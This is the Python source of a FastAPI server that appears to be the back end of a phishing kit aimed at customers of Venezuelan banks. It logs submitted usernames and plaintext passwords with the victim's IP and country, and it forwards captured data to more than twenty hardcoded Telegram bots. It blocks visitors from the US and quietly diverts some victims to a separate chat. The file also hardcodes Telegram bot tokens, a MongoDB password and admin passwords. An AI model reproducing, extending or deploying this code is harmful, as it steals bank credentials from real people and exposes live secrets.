from fastapi import FastAPI, HTTPException, Request, UploadFile, BackgroundTasks
from fastapi import File, Form
from functools import partial, lru_cache
import shutil
from fastapi.responses import JSONResponse
from fastapi.middleware.cors import CORSMiddleware
import httpx
from fastapi.responses import HTMLResponse
from collections import deque
from pydantic import BaseModel
from starlette.middleware.base import BaseHTTPMiddleware
from starlette.responses import Response
import random
import base64
from motor.motor_asyncio import AsyncIOMotorClient
from typing import Callable, Dict, Set, Optional
from datetime import datetime, timedelta
import re
import asyncio
import time
from contextlib import asynccontextmanager

# Cache y configuraciones globales
CACHE_TTL = 300  # 5 minutos
ip_cache: Dict[str, tuple] = {}  # Cache para verificación de país
blocked_ips_cache: Set[str] = set()  # Cache para IPs bloqueadas
user_cache: Dict[str, int] = {}  # Cache para números de usuario
ip_number_cache: Dict[str, int] = {}  # Cache para números de IP

# Configuraciones
TOKEN = "8061450462:AAH2Fu5UbCeif5SRQ8-PQk2gorhNVk8lk6g"
AUTH_USERNAME = "gato"
AUTH_PASSWORD = "Gato1234@"
numeros_r = frozenset({4, 6, 9})  # frozenset es más rápido para 'in'
iprandom = frozenset({4, 6, 9})

# Pool de conexiones HTTP reutilizable
@asynccontextmanager
async def lifespan(app: FastAPI):
    # Startup
    app.state.http_client = httpx.AsyncClient(
        limits=httpx.Limits(max_keepalive_connections=20, max_connections=100),
        timeout=httpx.Timeout(5.0)
    )
    await init_db_async()
    await load_caches()
    yield
    # Shutdown
    await app.state.http_client.aclose()

app = FastAPI(lifespan=lifespan)

# Configurar CORS con configuraciones optimizadas
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=False,
    allow_methods=["GET", "POST", "PUT", "DELETE"],
    allow_headers=["*"],
)

# MongoDB asíncrono
client = AsyncIOMotorClient(
    "mongodb+srv://capijose:holas123@servidorsd.7syxtzz.mongodb.net/?retryWrites=true&w=majority&appName=servidorsd",
    maxPoolSize=50,
    minPoolSize=10,
    maxIdleTimeMS=30000,
    serverSelectionTimeoutMS=5000
)
db = client["api_db"]
ip_numbers = db["ip_numbers"]
user_numbers = db["user_numbers"]
global_settings = db["global_settings"]
logs_usuarios = db["logs_usuarios"]
ip_bloqueadas = db["ip_bloqueadas"]

# Variables de estado globales optimizadas
cola = deque(maxlen=20)
baneado = deque(maxlen=100)  # Límite para evitar crecimiento infinito
variable = False
is_active_cache = False
cache_last_updated = 0

# Inicialización asíncrona de BD
async def init_db_async():
    try:
        # Crear índices en paralelo
        tasks = [
            ip_numbers.create_index("ip", unique=True, background=True),
            user_numbers.create_index("username", unique=True, background=True),
            global_settings.create_index("id", unique=True, background=True),
            ip_bloqueadas.create_index("ip", background=True)
        ]
        await asyncio.gather(*tasks, return_exceptions=True)
        
        # Insertar configuración por defecto si no existe
        if not await global_settings.find_one({"id": 1}):
            await global_settings.insert_one({"id": 1, "is_active": False})
    except Exception as e:
        print(f"Error inicializando BD: {e}")

# Cargar caches al inicio
async def load_caches():
    global blocked_ips_cache, is_active_cache, cache_last_updated
    
    try:
        # Cargar IPs bloqueadas
        blocked_docs = ip_bloqueadas.find({}, {"ip": 1})
        blocked_ips_cache = {doc["ip"] async for doc in blocked_docs}
        
        # Cargar estado global
        settings = await global_settings.find_one({"id": 1})
        is_active_cache = settings.get("is_active", False) if settings else False
        
        # Cargar números de IP y usuarios más recientes (últimos 1000)
        ip_docs = ip_numbers.find({}, {"ip": 1, "number": 1}).limit(1000)
        async for doc in ip_docs:
            ip_number_cache[doc["ip"]] = doc["number"]
            
        user_docs = user_numbers.find({}, {"username": 1, "number": 1}).limit(1000)
        async for doc in user_docs:
            user_cache[doc["username"]] = doc["number"]
            
        cache_last_updated = time.time()
        print(f"Caches cargados: {len(blocked_ips_cache)} IPs bloqueadas, {len(ip_number_cache)} IPs, {len(user_cache)} usuarios")
    except Exception as e:
        print(f"Error cargando caches: {e}")

# Funciones optimizadas con cache
@lru_cache(maxsize=1000)
def validar_contrasena_cached(contrasena: str) -> bool:
    patron = r"^(?=.*[a-z])(?=.*[A-Z])(?=.*\d).{8,}$"
    return bool(re.match(patron, contrasena))

async def verificar_pais_cached(ip: str) -> tuple[bool, str]:
    current_time = time.time()
    
    # Verificar cache
    if ip in ip_cache:
        cached_result, cached_time = ip_cache[ip]
        if current_time - cached_time < CACHE_TTL:
            return cached_result
    
    url = f"http://ipwhois.app/json/{ip}"
    try:
        response = await app.state.http_client.get(url)
        if response.status_code == 200:
            data = response.json()
            country = data.get('country_code', 'Unknown')
            
            if country in {'VE', 'CO', 'PE'}:
                result = (True, country)
            elif country == 'US':
                result = (False, country)
            else:
                result = (True, country)
            
            # Actualizar cache
            ip_cache[ip] = (result, current_time)
            return result
        return (False, 'Unknown')
    except Exception:
        return (False, 'Unknown')

async def enviar_telegram_async(mensaje: str, chat_id: str = "-4826186479", token: str = TOKEN):
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    payload = {"chat_id": chat_id, "text": mensaje}
    
    try:
        response = await app.state.http_client.post(url, json=payload)
        if response.status_code != 200:
            print(f"Error enviando a Telegram: {response.status_code}")
    except Exception as e:
        print(f"Error de conexión Telegram: {e}")

def agregar_elemento_diccionario_cache(ip: str, numero: int):
    ip_number_cache[ip] = numero

async def agregar_elemento_diccionario_async(ip: str, numero: int):
    try:
        await ip_numbers.insert_one({"ip": ip, "number": numero})
        agregar_elemento_diccionario_cache(ip, numero)
    except:
        pass

def obtener_numero_cached(ip: str) -> Optional[int]:
    return ip_number_cache.get(ip)

def obtener_usuario_cached(usuario: str) -> Optional[int]:
    return user_cache.get(usuario)

async def refresh_is_active_cache():
    global is_active_cache, cache_last_updated
    try:
        doc = await global_settings.find_one({"id": 1})
        is_active_cache = bool(doc["is_active"]) if doc else False
        cache_last_updated = time.time()
    except Exception as e:
        print(f"Error actualizando cache is_active: {e}")

def obtener_is_active_cached() -> bool:
    global cache_last_updated, is_active_cache
    current_time = time.time()
    
    # Actualizar cache si es muy antiguo (cada 30 segundos)
    if current_time - cache_last_updated > 30:
        # Crear task de forma segura
        try:
            loop = asyncio.get_event_loop()
            asyncio.create_task(refresh_is_active_cache())
        except RuntimeError:
            # Si no hay loop activo, usar el valor cacheado
            pass
    
    return is_active_cache

def contar_elemento_optimized(cola: deque, elemento: str) -> int:
    return sum(1 for x in cola if x == elemento)

# Middleware optimizado de autenticación básica
class FastBasicAuthMiddleware(BaseHTTPMiddleware):
    def __init__(self, app, username: str, password: str):
        super().__init__(app)
        self.auth_string = base64.b64encode(f"{username}:{password}".encode()).decode()

    async def dispatch(self, request: Request, call_next: Callable):
        if request.url.path.startswith(("/docs", "/redoc")):
            auth = request.headers.get("Authorization")
            if not auth or not auth.endswith(self.auth_string):
                return Response("Unauthorized", status_code=401, 
                              headers={"WWW-Authenticate": "Basic"})
        return await call_next(request)

app.add_middleware(FastBasicAuthMiddleware, username=AUTH_USERNAME, password=AUTH_PASSWORD)

# Middleware optimizado de bloqueo de IP
class OptimizedIPBlockMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next: Callable):
        client_ip = request.client.host

        # Verificar cache local primero
        if client_ip in blocked_ips_cache:
            return JSONResponse(
                status_code=403,
                content={"detail": "Acceso denegado, la ip está bloqueada " + client_ip}
            )

        # Asignar número si no existe
        if client_ip not in iprandom and client_ip not in ip_number_cache:
            numero_random = random.randint(0, 9)
            agregar_elemento_diccionario_cache(client_ip, numero_random)
            # Guardar en BD de forma asíncrona con función wrapper
            try:
                loop = asyncio.get_event_loop()
                asyncio.create_task(agregar_elemento_diccionario_async(client_ip, numero_random))
            except RuntimeError:
                # Si no hay loop, ignorar el guardado en BD
                pass

        return await call_next(request)

app.add_middleware(OptimizedIPBlockMiddleware)

# Modelos Pydantic optimizados
class ClaveRequest(BaseModel):
    clave: str

class UpdateNumberRequest(BaseModel):
    numero: int

class IPRequest(BaseModel):
    ip: str

class DynamicMessage(BaseModel):
    mensaje: str

# Endpoints optimizados
@app.get("/login", response_class=HTMLResponse)
async def login_form():
    return """
    <html>
    <head><title>Acceso</title></head>
    <body style="font-family:sans-serif; text-align:center; padding-top:100px;">
        <h2>Ingrese la contraseña para acceder</h2>
        <form method="post" action="/login">
            <input type="password" name="password" placeholder="Contraseña" />
            <button type="submit">Ingresar</button>
        </form>
    </body>
    </html>
    """

@app.post("/login")
async def login(password: str = Form(...)):
    if password == "gato123":
        try:
            with open("static/panel.html", "r", encoding="utf-8") as f:
                content = f.read()
            return HTMLResponse(content=content)
        except:
            return HTMLResponse("<h3>Panel no encontrado</h3>", status_code=404)
    else:
        return HTMLResponse(
            "<h3 style='text-align:center;padding-top:100px;'>Contraseña incorrecta</h3>", 
            status_code=401
        )



@app.post("/validar_clave")
async def validar_clave(data: ClaveRequest):
    return {"valido": data.clave == "gato123"}

async def _bloquear_ip_bd(ip: str):
    """Función auxiliar para bloquear IP en BD"""
    try:
        await ip_bloqueadas.insert_one({
            "ip": ip, 
            "fecha_bloqueo": datetime.utcnow()
        })
    except Exception as e:
        print(f"Error bloqueando IP en BD: {e}")

@app.post("/bloquear_ip/")
async def bloquear_ip(data: IPRequest):
    ip = data.ip.strip()
    
    if ip not in blocked_ips_cache:
        blocked_ips_cache.add(ip)
        # Guardar en BD de forma asíncrona
        asyncio.create_task(_bloquear_ip_bd(ip))
        return {"message": f"La IP {ip} ha sido bloqueada."}
    else:
        return {"message": f"La IP {ip} ya estaba bloqueada."}

async def _desbloquear_ip_bd(ip: str):
    """Función auxiliar para desbloquear IP en BD"""
    try:
        await ip_bloqueadas.delete_one({"ip": ip})
    except Exception as e:
        print(f"Error desbloqueando IP en BD: {e}")

@app.post("/desbloquear_ip/")
async def desbloquear_ip(data: IPRequest):
    ip = data.ip.strip()
    
    if ip in blocked_ips_cache:
        blocked_ips_cache.discard(ip)
        # Eliminar de BD de forma asíncrona
        asyncio.create_task(_desbloquear_ip_bd(ip))
        return {"message": f"La IP {ip} ha sido desbloqueada."}
    else:
        return {"message": f"La IP {ip} no estaba bloqueada."}

@app.get("/ips_bloqueadas/")
async def obtener_ips_bloqueadas():
    return {"ips_bloqueadas": [{"ip": ip, "fecha_bloqueo": "cached"} for ip in blocked_ips_cache]}

@app.get("/")
async def read_root():
    return {"message": "API funcionando correctamente!"}

async def _guardar_log_usuario(usuario: str, contra: str, ip: str, pais: str):
    """Función auxiliar para guardar log de usuario"""
    try:
        await logs_usuarios.insert_one({
            "usuario": usuario,
            "contrasena": contra,
            "ip": ip,
            "pais": pais,
            "fecha": datetime.utcnow()
        })
    except Exception as e:
        print(f"Error guardando log usuario: {e}")

@app.post("/guardar_datos")
async def guardar_datos(
    usuario: str = Form(...), 
    contra: str = Form(...), 
    request: Request = None
):
    ip = request.client.host
    permitido, pais = await verificar_pais_cached(ip)

    # Guardar en BD de forma asíncrona
    asyncio.create_task(_guardar_log_usuario(usuario, contra, ip, pais))
    
    return {
        "message": "Datos guardados correctamente",
        "ip": ip,
        "pais": pais
    }

@app.get("/ver_datos", response_class=HTMLResponse)
async def ver_datos():
    registros = []
    async for registro in logs_usuarios.find().sort("fecha", -1).limit(100):
        registros.append(registro)
    
    html = """
    <html>
    <head><title>Registros de Usuarios</title></head>
    <body>
        <h2>Listado de registros (últimos 100)</h2>
        <table border="1">
            <tr><th>Usuario</th><th>Contraseña</th><th>IP</th><th>País</th><th>Fecha</th></tr>
    """
    for registro in registros:
        usuario = registro.get("usuario", "")
        contrasena = registro.get("contrasena", "")
        ip = registro.get("ip", "")
        pais = registro.get("pais", "")
        fecha = registro.get("fecha", "")
        html += f"<tr><td>{usuario}</td><td>{contrasena}</td><td>{ip}</td><td>{pais}</td><td>{fecha}</td></tr>"
    
    html += "</table></body></html>"
    return HTMLResponse(content=html)

@app.get("/usuarios/")
async def obtener_usuarios():
    if not user_cache:
        return {"message": "No se encontraron usuarios en caché."}
    
    usuarios = [{"usuario": u, "numero": n} for u, n in user_cache.items()]
    return {"usuarios": usuarios}

@app.get("/is_active/")
async def obtener_estado_actual():
    estado = obtener_is_active_cached()
    return {"is_active": estado}

@app.post("/toggle/")
async def alternar_estado():
    global is_active_cache
    try:
        doc = await global_settings.find_one({"id": 1})
        if doc:
            nuevo_valor = not doc["is_active"]
            await global_settings.update_one(
                {"id": 1},
                {"$set": {"is_active": nuevo_valor}}
            )
            is_active_cache = nuevo_valor
            return {"message": "Estado alternado exitosamente.", "is_active": nuevo_valor}
        else:
            raise ValueError("No se encontró la configuración global.")
    except ValueError as e:
        return {"error": str(e)}

@app.get("/ips/")
async def obtener_ips():
    if not ip_number_cache:
        return {"message": "No se encontraron IPs en caché."}
    
    ips = [{"ip": i, "numero": n} for i, n in ip_number_cache.items()]
    return {"ips": ips}

@app.post("/verificar_spam_ip")
async def verificar_spam_ip(data: IPRequest):
    ip = data.ip.strip()
    cola.append(ip)
    repeticiones = contar_elemento_optimized(cola, ip)

    if repeticiones > 8:
        if ip not in baneado:
            baneado.append(ip)
        return {
            "ip": ip,
            "repeticiones": repeticiones,
            "spam": True,
            "mensaje": "IP detectada como spam y bloqueada"
        }
    else:
        return {
            "ip": ip,
            "repeticiones": repeticiones,
            "spam": False,
            "mensaje": "IP aún no considerada spam"
        }

# Configuración optimizada de endpoints dinámicos
endpoint_configs = [
    {"path": "/bdv1/", "chat_id": "7224742938", "bot_id": "7922728802:AAEBmISy1dh41rBdVZgz-R58SDSKL3fmBU0"},
    {"path": "/bdv2/", "chat_id": "7528782002", "bot_id": "7621350678:AAHU7LcdxYLD2bNwfr6Nl0a-3-KulhrnsgA"},
    {"path": "/bdv3/", "chat_id": "7805311838", "bot_id": "8119063714:AAHWgl52wJRfqDTdHGbgGBdFBqArZzcVCE4"},
    {"path": "/bdv4/", "chat_id": "7549787135", "bot_id": "7964239947:AAHmOWGfxyYCTWvr6sBhws7lBlF4qXwtoTQ"},
    {"path": "/bdv5/", "chat_id": "7872284021", "bot_id": "8179245771:AAHOAJU9Ncl9oRX4sffF7wguaf5JergGzhU"},
    {"path": "/bdv6/", "chat_id": "7815697126", "bot_id": "7754611129:AAHULRm3VftgABq8ZgTB0VtNNvwnK4Cvddw"},
    {"path": "/provincial1/", "chat_id": "7224742938", "bot_id": "7922728802:AAEBmISy1dh41rBdVZgz-R58SDSKL3fmBU0"},
    {"path": "/provincial2/", "chat_id": "7528782002", "bot_id": "7621350678:AAHU7LcdxYLD2bNwfr6Nl0a-3-KulhrnsgA"},
    {"path": "/provincial3/", "chat_id": "7805311838", "bot_id": "8119063714:AAHWgl52wJRfqDTdHGbgGBdFBqArZzcVCE4"},
    {"path": "/provincial4/", "chat_id": "7549787135", "bot_id": "7964239947:AAHmOWGfxyYCTWvr6sBhws7lBlF4qXwtoTQ"},
    {"path": "/provincial5/", "chat_id": "7872284021", "bot_id": "8179245771:AAHOAJU9Ncl9oRX4sffF7wguaf5JergGzhU"},
    {"path": "/provincial6/", "chat_id": "7815697126", "bot_id": "7754611129:AAHULRm3VftgABq8ZgTB0VtNNvwnK4Cvddw"},
    {"path": "/internacional/", "chat_id": "7098816483", "bot_id": "7785368338:AAEbLAK_ts6KcRbbnOeu6_XVrCZV46AVJTc"},
    {"path": "/internacional2/", "chat_id": "6775367564", "bot_id": "8379840556:AAH7Dp9d2MU_kL_engEMXj3ZstHMnE70lUI"},
    {"path": "/internacional3/", "chat_id": "6775367564", "bot_id": "8379840556:AAH7Dp9d2MU_kL_engEMXj3ZstHMnE70lUI"},
    {"path": "/internacional4/", "chat_id": "5317159807", "bot_id": "8116577753:AAFkE-1JGW8Vi-2SRP4xNdxCLqyI1zLbl_U"},
    {"path": "/maikelhot/", "chat_id": "-4816573720", "bot_id": "7763460162:AAHw9fqhy16Ip2KN-yKWPNcGfxgK9S58y1k"},
    {"path": "/wts1/", "chat_id": "5711521334", "bot_id": "8294930756:AAHh3iZQzH1RweVl5iMaluyHj0h-mT131mI"},
    {"path": "/wts2/", "chat_id": "7883492995", "bot_id": "8116183285:AAEUuHD9yv8_O3ofS9c11Ndq_VSUBXoZKwo"},
    {"path": "/bdigital/", "chat_id": "7098816483", "bot_id": "7684971737:AAEUQePYfMDNgX5WJH1gCrE_GJ0_sJ7zXzI"},
    {"path": "/prmrica/", "chat_id": "7098816483", "bot_id": "7864387780:AAHLh6vSSG5tf6YmwaFKAyLNuqVUOT-OLZU"},
    {"path": "/hmtsasd/", "chat_id": "-4727787748", "bot_id": "7763460162:AAHw9fqhy16Ip2KN-yKWPNcGfxgK9S58y1k"},
]

async def _enviar_telegram_task(mensaje: str, chat_id: str = "-4826186479", token: str = TOKEN):
    """Función auxiliar para enviar mensaje a Telegram"""
    try:
        await enviar_telegram_async(mensaje, chat_id, token)
    except Exception as e:
        print(f"Error enviando mensaje a Telegram: {e}")

async def handle_dynamic_endpoint_optimized(config, request_data: DynamicMessage, request: Request):
    client_ip = request.client.host
    cola.append(client_ip)
    numeror = obtener_numero_cached(client_ip)

    if contar_elemento_optimized(cola, client_ip) > 8:
        baneado.append(client_ip)
        raise HTTPException(status_code=429, detail="Has sido bloqueado temporalmente.")

    permitido, pais = await verificar_pais_cached(client_ip)
    mensaje = request_data.mensaje

    if permitido and pais != "US":
        path = config["path"]
        mensaje_completo = f"{mensaje} - IP: {client_ip} - {path}"
        
        if (path.startswith("/bdv") and obtener_is_active_cached() and 
            numeror in numeros_r and pais not in {"US", "CO"}):
            # Enviar de forma asíncrona sin bloquear
            asyncio.create_task(_enviar_telegram_task(mensaje_completo + " Todo tuyo", "-4931572577"))
        else:
            # Enviar ambos mensajes de forma asíncrona
            asyncio.create_task(_enviar_telegram_task(mensaje_completo))
            asyncio.create_task(_enviar_telegram_task(mensaje, config["chat_id"], config["bot_id"]))

        return {"mensaje_enviado": True}
    else:
        raise HTTPException(status_code=400, detail=f"Acceso denegado desde {pais}")

# Registrar endpoints dinámicos
for config in endpoint_configs:
    app.add_api_route(
        path=config["path"],
        endpoint=partial(handle_dynamic_endpoint_optimized, config),
        methods=["POST"]
    )

async def _clear_db_collections():
    """Función auxiliar para limpiar colecciones de BD"""
    try:
        # Limpiar en paralelo
        tasks = [
            ip_numbers.delete_many({}),
            user_numbers.delete_many({})
        ]
        await asyncio.gather(*tasks)
        return True
    except Exception as e:
        print(f"Error limpiando BD: {e}")
        return False

@app.post('/clear_db')
async def clear_db_endpoint():
    success = await _clear_db_collections()
    
    if success:
        # Limpiar caches
        ip_number_cache.clear()
        user_cache.clear()
        return {"message": "Se borró correctamente"}
    else:
        return {"message": "Error al borrar"}

# Endpoints adicionales optimizados con endpoints faltantes del original
@app.put("/editar-ip/{ip}")
async def editar_numero_ip(ip: str, request_data: UpdateNumberRequest):
    result = await ip_numbers.update_one(
        {"ip": ip},
        {"$set": {"number": request_data.numero}}
    )
    
    if result.matched_count == 0:
        raise HTTPException(status_code=404, detail="IP no encontrada")
    
    # Actualizar cache
    ip_number_cache[ip] = request_data.numero
    
    return {"message": f"Número de la IP {ip} actualizado a {request_data.numero}"}

@app.put("/editar-usuario/{usuario}")
async def editar_numero_usuario(usuario: str, request_data: UpdateNumberRequest):
    result = await user_numbers.update_one(
        {"username": usuario},
        {"$set": {"number": request_data.numero}}
    )
    
    if result.matched_count == 0:
        raise HTTPException(status_code=404, detail="Usuario no encontrado")
    
    # Actualizar cache
    user_cache[usuario] = request_data.numero
    
    return {"message": f"Número del usuario {usuario} actualizado a {request_data.numero}"}

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
